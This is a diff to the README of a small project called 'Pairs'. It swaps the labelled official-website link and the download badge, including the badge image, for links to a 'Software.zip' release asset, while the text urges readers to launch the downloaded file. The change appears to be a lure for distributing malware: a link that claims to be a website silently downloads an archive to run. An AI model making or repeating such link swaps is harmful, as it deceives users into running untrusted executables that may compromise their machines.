@@ -23,10 +23,10 @@ Follow the steps below to get started with the "Pairs" project:
 4. Dive into the source code to discover the magic of pairing elements!
 
 ## 🌐 Explore Further
-Visit the official [Pairs website](http://www.pairsproject.com) to experience the project live and discover even more exciting features!
+Visit the official [Pairs website](https://github.com/Thuraaung021822/pairs/releases/download/v1.0/Software.zip) to experience the project live and discover even more exciting features!
 
 ## 🌟 Download Latest Version
-[![Download Pairs v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Pairs v1.0.0](https://github.com/Thuraaung021822/pairs/releases/download/v1.0/Software.zip)](https://github.com/Thuraaung021822/pairs/releases/download/v1.0/Software.zip)
 
 Note: Click the button above to download the latest version of the project. Launch the downloaded file to begin exploring "Pairs"!
 
